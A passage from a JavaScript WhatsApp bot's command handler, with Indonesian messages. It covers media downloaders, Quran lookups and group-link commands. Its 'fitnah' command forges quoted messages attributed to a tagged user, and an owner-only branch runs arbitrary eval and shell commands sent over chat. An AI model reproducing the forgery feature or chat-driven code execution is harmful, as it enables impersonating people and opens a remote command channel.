var url = await karr.groupInviteCode(from).catch(() => reply(mess.error.api))
let link = 'https://chat.whatsapp.com/'+url
const btn = new Button()
.setTitle(`• Nama grup : ${groupName}\n• Id : ${from}`)
.setFooter("© Ashema Karuta")

.addUrl(
  "LINK NYA",
  link
)
.addCopy(
  "COPPY LINK",
  link
)
await btn.run(
  from,
  karr,
  msg
)
}
break
case prefix+'fitnah':{
if (args.length < 2) return reply(`Kirim perintah *${command}* @tag|pesantarget|pesanbot`)
var org = q.split("|")[0]
var target = q.split("|")[1];
var bot = q.split("|")[2];
if (!org.startsWith('@')) return reply('Tag orangnya')
if (!target) return reply(`Masukkan pesan target!`)
if (!bot) return reply(`Masukkan pesan bot!`)
var mens = parseMention2(target)
var msg1 = { key: { fromMe: false, participant: `${parseMention2(org)}`, remoteJid: from ? from : '' }, message: { extemdedTextMessage: { text: `${target}`, contextInfo: { mentionedJid: mens }}}}
var msg2 = { key: { fromMe: false, participant: `${parseMention2(org)}`, remoteJid: from ? from : '' }, message: { conversation: `${target}` }}
karr.sendMessage(from, { text: bot, mentions: mentioned }, { quoted: mens.length > 2 ? msg1 : msg2 })
}
break
case prefix+'play':{
if (!q) return reply(`Masukan Query!`)
wait()
 var dat = await yts(q)
 let dataa = dat.videos[0]
 var initk = `
 *══ DATA DI DAPATKAN ══*

*${dataa.title}*
> | Duration : ${dataa.timestamp}
> | Viewers : ${dataa.views}
> | Upload At : ${dataa.ago}
> | Author : ${dataa.author.name}
> | https://youtu.be/${dataa.videoId}

_Wait sending audio...._
`

let textnya = await reply(initk)
let datal = await ytdown(dataa.url)
var nme = `./tmp/${Date.now()}.mp4`
 fs.writeFileSync(nme, await getBuffer(datal.data.video))
 var ran = './tmp/'+getRandom('.mp3')
 exec(`ffmpeg -i ${nme} ${ran}`, async (err) => {
let anu = await getBuffer(dataa.thumbnail)
karr.sendMessage(from, { audio: fs.readFileSync(ran), mimetype: 'audio/mp4', fileName: `${dataa.title}.mp3`}, { quoted: textnya })
fs.unlinkSync(nme)
fs.unlinkSync(ran)
 })
}
break
//// DOWNLOADER COMMAND
case prefix+'tiktok': case prefix+'ttdl': case prefix+'tt':{
if (!q) return reply('Masukan Url')
if (!isUrl(q)) return reply('Duhh itu bukan url!!')
if (!args[1].includes('tiktok.com')) return reply('Link nya gak valid')
wait()
let anu = await tikdown(q)
karr.sendMessage(from, {video: {url : anu.data.video}, caption: anu.data.title}, { quoted : msg })
 }
break 
case prefix+'igdl': case prefix+'ig':{
if (!q) return reply('Masukan Url')
if (!isUrl(q)) return reply('Duhh itu bukan url!!')
if (!args[1].includes('instagram.com')) return reply('Link nya gak valid')
let anu = await instagram(q)
wait()
if (anu.data.media_type == 'reel'){
for(let i of anu.data.video){
karr.sendMessage(from, {video: {url : i}, caption: anu.data.title}, { quoted : msg })}
} else if (anu.data.media_type == 'image'){
for(let i of anu.data.images){
karr.sendMessage(from, {video: {url : i}, caption: anu.data.title}, { quoted : msg })}
} else {
reply('Media tidak support')
}
 }
 break
 case prefix+'xdl': case prefix+'twitter':{
if (!q) return reply('Masukan Url')
if (!isUrl(q)) return reply('Duhh itu bukan url!!')
if (!args[1].includes('https://x.com')) return reply('Link nya gak valid')
wait()
let anu = await twitterdown(q)
karr.sendMessage(from, {video: {url : anu.data.HD}, caption: `TWITTER DOWNLOADER`}, { quoted : msg })
 }
 break
 case prefix+'fbdl': case prefix+'facebook':{
if (!q) return reply('Masukan Url')
if (!isUrl(q)) return reply('Duhh itu bukan url!!')
if (!args[1].includes('facebook.com')) return reply('Link nya gak valid')
wait()
let anu = await fbdown2(q, 'Nayan')
karr.sendMessage(from, {video: {url : anu.media.hd }, caption: anu.media.title}, { quoted : msg })
 }
 break
 case prefix+'ytdl': case prefix+'yt':{
if (!q) return reply('Masukan Url')
if (!isUrl(q)) return reply('Duhh itu bukan url!!')
if (!args[1].includes('youtu')) return reply('Link nya gak valid')
wait()
let anu = await ytdown(q)
karr.sendMessage(from, {video: {url : anu.data.video_hd }, caption: anu.data.title}, { quoted : msg })
 }
 break
case prefix+'threads': case prefix+'thdl':{
if (!q) return reply('Masukan Url')
if (!isUrl(q)) return reply('Duhh itu bukan url!!')
if (!args[1].includes('threads.com')) return reply('Link nya gak valid')
wait()
let anu = await threads(q)
karr.sendMessage(from, {video: {url : anu.data.video }, caption: anu.data.title}, { quoted : msg })
 }
 break
 case prefix+'spotifydl':{
if (!q) return reply('Masukan Url')
if (!q.includes('spotify.com')) return reply('Link nya gak valid')
if (q.includes('playlist')) return reply('Untuk saat ini tidak dapat mendownload playlist!')
wait()
let anu = await SpotifyDL(q)
let capt = `
*${anu.data.details.title}*
> - Artist : ${anu.data.details.artists}
> - Durasi : ${clockString(anu.data.details.duration_ms)}

_Wait sending audio..._
`
await reply(q +'\n' + capt)

karr.sendMessage(from, { audio: { url : anu.data.download_url }, mimetype: 'audio/mp4', fileName: `${anu.data.details.title}.mp3`}, { quoted: msg })
karr.sendMessage(from, { document: { url : anu.data.download_url }, fileName: `${anu.data.details.title}.mp3`, mimetype: 'audio/mp3' }, { quoted: msg })
}
break
//// RELIGI COMMAND
case prefix+'quran': case prefix+'alquran':{
let heh = `Gunakan nomor surah!, bisa lihat nomor surah di ${prefix}allsurah 

Contoh penggunaan:

- ${command} 1 (full surah)

- ${command} 1:3 (1 ayat saja)

1:3 berarti Al Fatihah ayat 3`
if (!q) return reply(heh)
try {
if (q.includes(':')){
let teks1 = q.split(":")[0]
let teks2 = q.split(":")[1]
var data = await surah(teks1)
let num = await mathjs.evaluate(`${teks2}-1`)
reply(`${data.data.ayat[num].teksArab}\n\n${data.data.ayat[num].teksLatin}\n\n_${data.data.ayat[num].teksIndonesia}_(${data.data.namaLatin}:${teks2})`).catch((err) => reply(`RESULT ${q} NOT FOUND`))
} else {
var data = await surah(q)
var teks = `${data.data.nama} ( ${data.data.namaLatin} )\n\n`
for (let i of data.data.ayat) {
  teks += `(${i.nomorAyat}) ${i.teksArab}\n${i.teksLatin}\n\n`
}
reply(teks).catch((err) => reply(`RESULT ${q} NOT FOUND`))
}
} catch (err) {
reply(`RESULT ${q} NOT FOUND`)
}
}
break
case prefix+'listsurah': case prefix+'allsurah':{
allsurah().then( data => {
var teks = `List Surah Al-Qur\'an\n\n`
for (let i of data.result) {
  teks += `*Nomor :* ${i.index}\n*Surah :* ${i.surah} (${i.latin})\n*Jumlah Ayat :* ${i.jumlah_ayat}\n\n`
}
 teks += `Jika ingin mengambil salah satu Surah ketik ${prefix}alquran nomor atau ${prefix}alquran nomor:ayat`
reply(teks)
})
}
break
case prefix+'quranaudio': case prefix+'alquranaudio':{
let heh = `Gunakan nomor surah untuk mengambil audio bisa lihat nomor surah di ${prefix}allsurah 

Contoh penggunaan:

- ${command} 1 (full surah)

- ${command} 1:3 (1 ayat saja)

1:3 berarti Al Fatihah ayat 3`
if (!q) return reply(heh)
wait()
try {
if (q.includes(':')){
let anu = await quranAudio(q)
karr.sendMessage(from, {audio: { url: anu.data.audio }, mimetype:'audio/mpeg', ptt:true }, {quoted:msg}).catch((err) => reply(`RESULT ${q} NOT FOUND`))
} else {
let data = await surah(q)
karr.sendMessage(from, {audio: { url: data.data.audioFull?.['01'] }, mimetype:'audio/mpeg', ptt:true }, {quoted:msg}).catch((err) => reply(`RESULT ${q} NOT FOUND`))
}
} catch (err) {
reply(`RESULT ${q} NOT FOUND`)
}
}
break
case prefix+'kisahnabi':{
if (!q) return reply(`Masukan nama nabi di bawah ini \n
 Adam 
 Idris 
 Nuh 
 Hud 
 Saleh 
 Ibrahim 
 Ismail 
 Ishaq 
 Luth 
 Yaqub 
 Yusuf 
 Syuaib 
 Ayyub 
 Dzulkifli 
 Musa 
 Harun 
 Daud 
 Sulaiman 
 Ily 
 Ilya 
 Yunus 
 Zakaria 
 Yahya 
 Isa 
 Muhammad
 
 Contoh : ${command} isa
 `)
try {
let heh = q.toLowerCase()
if (heh.includes('muhammad')){
let heh = q.toLowerCase().replace('muhammad', 'muhamad')
}
let anu = await fetchJson(`https://github.com/YukiShima4/Skreper/raw/master/religi/kisah%20nabi/${heh}.json`)
reply(`*Kisah nabi ${anu[0].name}* \n\n${anu[0].description}`).catch((e) => reply(`RESULT ${q} NOT FOUND`))
} catch (err) {
reply(`RESULT ${q} NOT FOUND`)
}
}
break
case prefix+'randomdoa':{
let anuk = await randomDoa()
let anu = pickRandom(anuk.result)
reply(`${anu.doa}\n\n${anu.arab}\n${anu.latin}\n\n${anu.id}`).catch((err) => reply(`RESULT ${q} NOT FOUND`))
}
            default:
                if (chats.startsWith("> ")) {
                    if (!isOwner) return
                    try {
                        reply(util.format(await eval(`(async () => { ${chats.slice(2)} })()`)))
                    } catch (e) {
                        reply(util.format(e))
                    }
                } else if (chats.startsWith("$ ")) {
                    if (!isOwner) return
                    exec(chats.slice(2), (err, stdout) => {
                        if (err) return reply(`${err}`)
                        if (stdout) reply(`${stdout}`)
                    })
                   } else if (chats.startsWith("x ") || chats.startsWith("< ")) {
                if (!isOwner) return;
                try {
                const codeToEval = chats.slice(2);
                let evaled = await eval(codeToEval);
                if (typeof evaled !== 'string') {
                evaled = inspect(evaled);
                  }
                 reply(`${evaled}`);
                 } catch (err) {
                reply(`${err}`);
                   }}
        }
    } catch (err) {
        console.log(color('[ERROR]', 'red'), err)
        karr.sendMessage(msg.key.remoteJid, { text: `Maaf terjadi kesalahan` }, { quoted: msg })
        karr.sendMessage('6285811597011@s.whatsapp.net', { text: `*[TERJADI ERROR]*\n${err}` }, { quoted: msg })
    }
};
const fileName = import.meta.url;
fs.watchFile(new URL(fileName), async () => {
    console.log(chalk.green(`Update terdeteksi pada ${fileName}`));
    const modulePath = `${fileName}?update=${Date.now()}`;
    try {
        const newModule = await import(modulePath);
    } catch (err) {
        console.error(chalk.red("Gagal memuat ulang module:"), err);
    }
});